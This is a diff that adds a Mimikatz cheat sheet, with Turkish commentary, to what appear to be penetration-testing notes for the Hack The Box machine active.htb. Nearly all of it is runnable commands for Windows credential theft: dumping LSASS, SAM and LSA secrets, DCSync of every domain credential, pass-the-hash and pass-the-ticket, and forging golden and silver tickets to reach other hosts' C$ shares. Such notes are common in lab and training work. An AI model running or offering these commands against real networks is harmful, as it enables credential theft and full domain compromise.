@@ -31,3 +31,74 @@
   
              --Sharphound.exe
   .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+
+             --MIMIKATZ.EXE--
+  Mimikatz.exe oturumunu her zaman şunu girerek başlatın: 
+         privilege::debug
+         token::elevate
+
+         Mimikatz'ı çalıştırdığımda genellikle aşağıdaki komutların çoğunu 
+         çalıştırmaya çalışırım veya en azından LSASS'ı, SAM'i ve sırları atar.
+
+         Mimikatz.exe Cheat Sheet:
+         #Dump LSASS:
+         mimikatz privilege::debug
+         mimikatz token::elevate
+         mimikatz sekurlsa::logonpasswords
+         #(Over) Pass The Hash
+         mimikatz privilege::debug
+         mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
+         #List all available kerberos tickets in memory
+         mimikatz sekurlsa::tickets
+         #Dump local Terminal Services credentials
+         mimikatz sekurlsa::tspkg
+         #Dump and save LSASS in a file
+         mimikatz sekurlsa::minidump c:\temp\lsass.dmp
+         #List cached MasterKeys
+         mimikatz sekurlsa::dpapi
+         #List local Kerberos AES Keys
+         mimikatz sekurlsa::ekeys
+         #Dump SAM Database
+         mimikatz lsadump::sam
+         #Dump SECRETS Database
+         mimikatz lsadump::secrets
+         #Inject and dump the Domain Controller’s Credentials
+         mimikatz privilege::debug
+         mimikatz token::elevate
+         mimikatz lsadump::lsa /inject
+         #Dump the Domain’s Credentials without touching DC’s LSASS and also remotely
+         mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+         #List and Dump local kerberos credentials
+         mimikatz kerberos::list /dump
+         #Pass The Ticket
+         mimikatz kerberos::ptt <PathToKirbiFile>
+         #List TS/RDP sessions
+         mimikatz ts::sessions
+         #List Vault credentials
+         mimikatz vault::list
+
+         Pass-The-Ticket (PTT):
+         mimikatz.exe
+         privilege::debug
+         sekurlsa::tickets /export [this will export all of the .kirbi tickets into your present working directory]
+         Mümkünse dönen sonuçta administrator@krbtgt ticketi ara.
+         ve pass the ticket yap:
+         kerberos::ptt <.kirbi ticket>
+         klist [not in mimikatz session — verifies your ticket was injected]
+
+         Golden Ticket Attack:
+         Bu saldırı, etki alanındaki herhangi bir kullanıcının TGT'sini 
+         boşaltarak çalışır, bu tercihen bir etki alanı yöneticisi olur, ancak 
+         altın bir bilet için krbtgt biletini ve bir gümüş bilet için herhangi 
+         bir hizmet veya etki alanı biletini atarsınız. 
+
+         mimikatz.exe
+         privilege::debug
+         lsadump::lsa /inject /name:krbtgt 
+         [to create a silver ticket change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account]
+         kerberos::golden /user:administrator /domain:<domain.local> /sid:<krbtgt’s full SID> /krbtgt:<NTLM Hash of krbtgt> /id:500 
+         [to create a silver ticket user a different service account — place the NTLM, SID, and id 1103 into the proper slots of this command]
+
+         Altın/Gümüş bileti olan diğer makinelere erişmek için: 
+         misc::cmd [to spawn cmd.exe instance for your new ticket]
+         dir \\<other machine name or IP>\C$
